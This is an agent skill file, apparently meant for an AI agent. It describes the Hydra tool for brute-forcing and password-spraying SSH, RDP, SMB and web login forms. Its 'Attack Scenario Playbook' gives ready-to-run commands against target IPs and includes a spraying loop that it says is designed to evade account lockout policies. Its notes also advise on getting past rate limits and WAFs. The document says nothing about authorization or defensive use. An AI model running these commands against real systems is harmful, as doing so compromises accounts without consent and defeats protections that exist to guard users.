---
name: hydra-service-brute
description: "Hydra brute-forces SSH, RDP, and web login forms. Signals: brute force, password spraying, single or dictionary usernames, single or dictionary passwords."
zh-signals: "Hydra (thc-hydra): SSH 与 RDP 口令爆破、Web 登录表单爆破。信号:暴力破解,口令喷射,单个 / 字典用户名,单个 / 字典密码。"
when-to-use: >-
  Use to brute-force SSH, RDP, SMB, and web login forms with dictionary or
  single credentials and configurable parallelism.
---

# Hydra (thc-hydra)

- Attack Category: C28 Brute Force and Password Spraying
- Upstream Repository: https://github.com/vanhauser-thc/thc-hydra
- Upstream License: AGPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
apt install hydra          # bundled with Kali/Debian
# or compile it: https://github.com/vanhauser-thc/thc-hydra see the BUILD docs
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `-l user / -L users.txt` | Single / dictionary usernames |
| `-p pass / -P pass.txt` | Single / dictionary passwords |
| `-t 16` | Number of parallel tasks (default 16, beware of account lockouts) |
| `-f` | Stop at the first hit |
| `-vV` | Show every attempt, useful for troubleshooting |
| `-o result.txt` | Save the hits |
| `ssh://target` | SSH brute force |
| `rdp://target` | RDP brute force |
| `smb://target` | SMB brute force |
| `http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"` | Web form brute force, ^USER^/^PASS^ placeholders |
| `cisco://target` / `mysql://target` / `ftp://target` | Same approach for other protocols |

## Attack Scenario Playbook

### SSH and RDP credential brute force

```bash
hydra -L users.txt -P passwords.txt ssh://10.0.0.5 -t 4 -f -o ssh_hits.txt
hydra -l administrator -P passwords.txt rdp://10.0.0.6 -t 8
```

### Web login form brute force

```bash
hydra -l admin -P passwords.txt 10.0.0.7 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&submit=Login:F=Login failed" -V
```

### Password spraying (one password against many accounts, to evade lockout policies)

```bash
for p in $(cat season_pass.txt); do
  hydra -L users.txt -p "$p" ssh://10.0.0.5 -t 2 -f && break
done
```

## Notes

An overly large `-t` easily triggers account lockouts and alerts; the failure marker `F=` in http-post-form must match the page's actual output; when the hit rate is low, first check whether a WAF or rate limit is blocking you.
